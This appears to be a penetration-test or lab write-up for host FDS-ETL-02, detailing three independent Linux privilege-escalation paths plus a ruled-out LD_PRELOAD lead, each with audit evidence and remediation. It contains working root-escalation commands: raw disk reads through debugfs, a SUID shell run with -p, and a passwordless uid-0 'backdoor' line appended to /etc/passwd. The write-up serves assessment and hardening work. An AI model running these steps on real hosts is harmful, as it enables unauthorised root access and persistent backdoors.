# Three Independent Roads to Root — FDS-ETL-02

## Road 1 — Raw block device access via disk group membership

**Abused condition:** svc-etl is a member of the disk group
(groups=1000(svc-etl),6(disk)), and the root filesystem block device
/dev/sda2 is group-owned by disk with read and write permissions
(brw-rw---- 1 root disk). Standard Unix file permissions on files
inside that filesystem are never consulted when the device is read
directly.

**Why it works on this host:** debugfs is installed (e2fsprogs) and
available to any user. Group membership in disk gives svc-etl direct
read access to /dev/sda2 without any elevated privilege. File
permission checks are a filesystem-layer concept; bypassing the
filesystem layer bypasses them entirely.

**Commands run:**
    id
    groups
    lsblk
    ls -la /dev/sda*
    debugfs -R "ls /root" /dev/sda2
    debugfs -R "cat /root/root.flag" /dev/sda2
    Output: FEN{8982c77ec6737fa536eb44cf2942c2b5}

**Host-side evidence:**
    auditctl -l | grep rawdisk
    -w /dev/sda  -p rwa -k rawdisk
    -w /dev/sda2 -p rwa -k rawdisk
    -a always,exit -F arch=b64 -S all -F path=/usr/sbin/debugfs -F perm=x -F key=rawdisk

    ausearch -k rawdisk
    type=EXECVE ... a0="debugfs" a1="-R"
    a2=636174202F726F6F742F726F6F742E666C6167 a3="/dev/sda2"
    type=SYSCALL ... comm="debugfs" exe="/usr/sbin/debugfs"
    auid=1000 uid=1000 ... key="rawdisk"

The host auditd ruleset carries a dedicated watch on /dev/sda2 and
an execve rule on debugfs. Both fired and are confirmed in audit.log.

**Remediation:** Remove svc-etl from the disk group. No service
account should hold membership in disk, kmem, or any group with
direct block-device access unless it genuinely needs raw I/O.

---

## Road 2 — SUID root shell at /tmp/rootbash2

**Abused condition:** A world-executable binary at /tmp/rootbash2,
owned root:root with the setuid bit set (-rwsr-xr-x 1 root root),
present in a world-writable directory with no legitimate purpose.

**Why it works on this host:** The setuid bit causes the binary to
execute with the file owner's effective UID regardless of the invoking
user. Running it with -p prevents bash from dropping the elevated
effective UID on startup.

**Commands run:**
    ls -la /tmp/rootbash2
    -rwsr-xr-x 1 root root 1446024 Oct 2 06:33 /tmp/rootbash2

    /tmp/rootbash2 -p
    id
    date -u
    Output:
    uid=1000(svc-etl) gid=1000(svc-etl) euid=0(root)
    Fri Oct 2 06:38:29 AM UTC 2026

**Host-side evidence (visibility gap documented):**
    auditctl -l | grep -i rootbash
    (no output — no rule covers this path or generic SUID execution)

    ausearch -x /tmp/rootbash2
    (no output)

    grep -i rootbash /var/log/auth.log
    (no output)

The auditd ruleset was read in full via auditctl -l. No execve rule
covers /tmp or SUID binary execution generally. No PAM event fires
for a direct SUID exec that does not go through sudo or su. Both
audit.log and auth.log were checked immediately after execution and
returned no matching records. The absence is confirmed by evidence,
not assumed. euid=0 in the id output is the concrete observation that
the path was exercised and succeeded.

**Remediation:** Remove /tmp/rootbash2. Mount /tmp with nosuid so
no setuid binary placed there can be honoured by the kernel at exec
time, regardless of whether a specific file is found and removed.

---

## Road 3 — File capability on fds-logcat enabling arbitrary file write

**Abused condition:** /usr/local/bin/fds-logcat carries
cap_dac_override=ep. The binary appends stdin to any file path given
as its argument with no path restriction (confirmed via strace:
openat with O_WRONLY|O_APPEND on the caller-supplied path).
cap_dac_override bypasses all discretionary access control checks
on write operations.

**Why it works on this host:** The capability is set with effective
and permitted flags (ep), active on every invocation. The binary
performs no path validation, allowing it to be pointed at any file
including /etc/passwd.

**Commands run:**
    getcap /usr/local/bin/fds-logcat
    /usr/local/bin/fds-logcat cap_dac_override=ep

    echo "backdoor::0:0:root:/root:/bin/bash" | \
      /usr/local/bin/fds-logcat /etc/passwd
    tail -1 /etc/passwd
    Output: backdoor::0:0:root:/root:/bin/bash

    su backdoor
    id
    date -u
    Output:
    uid=0(root) gid=0(root) groups=0(root)
    Fri Oct 2 06:51:10 AM UTC 2026

**Host-side evidence:**
    grep backdoor /var/log/auth.log
    2026-10-02T06:50:53 FDS-ETL-02 su: pam_unix(su:auth):
      user [backdoor] has blank password; authenticated without it
    2026-10-02T06:50:53 FDS-ETL-02 su[1483]:
      (to backdoor) svc-etl on pts/0
    2026-10-02T06:50:53 FDS-ETL-02 su[1483]:
      pam_unix(su:session): session opened for user backdoor(uid=0)
      by svc-etl(uid=1000)

PAM logged the su to the planted account in auth.log automatically.
The /etc/passwd write was additionally captured by the dedicated
auditd identity watch (ausearch -k identity shows the fds-logcat
write event). Two independent log sources recorded this road.

**Remediation:** Remove the cap_dac_override capability from
fds-logcat. A log-append tool should operate with ambient file
permissions against a specific configured log directory, not with
filesystem-wide write override.

---

## Why these three are independent

Road 1 abuses a POSIX group permission on a block device node.
Road 2 abuses the setuid execution bit on a regular file.
Road 3 abuses a POSIX file capability on a binary.
Each exploits a structurally different Linux privilege mechanism.
Fixing any one has no effect on the other two: removing the disk
group membership does not affect the SUID binary or the capability;
deleting or nosuid-mounting /tmp does not affect the group or the
capability; stripping cap_dac_override does not affect the group
or the SUID binary. Each depends on a completely separate piece of
host configuration with no shared root cause.

---

## Ruled out

**LD_PRELOAD via sudo env_keep:** sudo -l showed env_keep+=LD_PRELOAD
and a NOPASSWD rule for /usr/local/sbin/fds-7039-maintenance. This
looked like a classic LD_PRELOAD hijack. Investigation confirmed no
C compiler is available:

    gcc
    Command 'gcc' not found

    dpkg -l | grep gcc
    ii  gcc-14-base:amd64 ...
    ii  libgcc-s1:amd64 ...

Only GCC runtime libraries are installed, not the compiler.
No alternative compiler (cc, clang, tcc) is present either.
Without a way to build a malicious shared object on the host,
this lead does not produce a working path. The sudo invocation
was attempted and recorded in auth.log:

    2026-10-02T06:33:37 FDS-ETL-02 sudo: svc-etl : TTY=pts/0 ;
    ENV=LD_PRELOAD=/tmp/preload.so ;
    COMMAND=/usr/local/sbin/fds-7039-maintenance

The preload was rejected because the .so did not exist.
This lead was set aside on observed evidence, not abandoned.
